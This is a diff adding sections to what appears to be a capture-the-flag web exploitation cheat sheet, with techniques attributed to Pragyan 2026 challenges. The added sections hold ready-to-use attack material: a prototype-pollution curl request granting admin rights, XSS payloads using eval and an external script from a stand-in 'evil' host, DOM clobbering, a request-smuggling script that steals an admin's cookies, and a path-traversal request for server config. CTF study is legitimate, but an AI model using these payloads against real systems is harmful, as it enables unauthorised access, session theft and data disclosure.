@@ -134,6 +134,16 @@ See [server-side.md](server-side.md) for full payloads and bypass techniques.
 **VM escape:** `this.constructor.constructor("return process")()` → RCE
 **Full chain:** pollution → enable JS eval in Happy-DOM → VM escape → RCE
 
+**Prototype pollution permission bypass (Server OC, Pragyan 2026):**
+```bash
+# When Express.js endpoint checks req.body.isAdmin or similar:
+curl -X POST -H 'Content-Type: application/json' \
+  -d '{"Path":"value","__proto__":{"isAdmin":true}}' \
+  'https://target/endpoint'
+# __proto__ pollutes Object.prototype, making isAdmin truthy on all objects
+```
+**Key insight:** Always try `__proto__` injection on JSON endpoints, even when the vulnerability seems like something else (race condition, SSRF, etc.).
+
 See [node-and-prototype.md](node-and-prototype.md) for detailed exploitation.
 
 ## Auth & Access Control Quick Reference
@@ -242,6 +252,73 @@ const code = fs.readFileSync('jsfuck.js', 'utf8');
 const func = eval(code.slice(0, -2));
 console.log(func.toString());  // Reveals original code with hardcoded flag
 ```
+
+## Shadow DOM XSS (Pragyan 2026)
+
+**Closed Shadow DOM exfiltration:** Wrap `attachShadow` in a Proxy to capture shadow root references:
+```javascript
+var _r, _o = Element.prototype.attachShadow;
+Element.prototype.attachShadow = new Proxy(_o, {
+  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
+});
+// After target script creates shadow DOM, _r contains the root
+```
+
+**Indirect eval scope escape:** `(0,eval)('code')` escapes `with(document)` scope restrictions.
+
+**Payload smuggling via avatar URL:** Encode full JS payload in avatar URL after fixed prefix, extract with `avatar.slice(N)`:
+```html
+<svg/onload=(0,eval)('eval(avatar.slice(24))')>
+```
+
+**`</script>` injection (Shadow Fight 2):** Keyword filters often miss HTML structural tags. `</script>` closes existing script context, `<script src=//evil>` loads external script. External script reads flag from `document.scripts[].textContent`.
+
+## DOM Clobbering + MIME Mismatch (Pragyan 2026)
+
+**MIME type confusion:** CDN/server checks for `.jpeg` but not `.jpg` → serves `.jpg` as `text/html` → HTML in JPEG polyglot executes as page.
+
+**Form-based DOM clobbering:**
+```html
+<form id="config"><input name="canAdminVerify" value="1"></form>
+<!-- Makes window.config.canAdminVerify truthy, bypassing JS checks -->
+```
+
+## HTTP Request Smuggling via Cache Proxy (Pragyan 2026)
+
+**Cache proxy desync:** When a caching TCP proxy returns cached responses without consuming request bodies, leftover bytes are parsed as the next request.
+
+**Cookie theft pattern:**
+1. Create cached resource (e.g., blog post)
+2. Send request with cached URL + appended incomplete POST (large Content-Length, partial body)
+3. Cache proxy returns cached response, doesn't consume POST body
+4. Admin bot's next request bytes fill the POST body → stored on server
+5. Read stored request to extract admin's cookies
+
+```python
+inner_req = (
+    f"POST /create HTTP/1.1\r\n"
+    f"Host: {HOST}\r\n"
+    f"Cookie: session={user_session}\r\n"
+    f"Content-Length: 256\r\n"  # Large, but only partial body sent
+    f"\r\n"
+    f"content=LEAK_"  # Victim's request completes this
+)
+outer_req = (
+    f"GET /cached-page HTTP/1.1\r\n"
+    f"Content-Length: {len(inner_req)}\r\n"
+    f"\r\n"
+).encode() + inner_req
+```
+
+## Path Traversal: URL-Encoded Slash Bypass (Pragyan 2026)
+
+**`%2f` bypass:** Nginx route matching doesn't decode `%2f` but filesystem does:
+```bash
+curl 'https://target/public%2f../nginx.conf'
+# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
+# Filesystem resolves to /public/../nginx.conf → /nginx.conf
+```
+**Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.
 
 ## Common Flag Locations
 
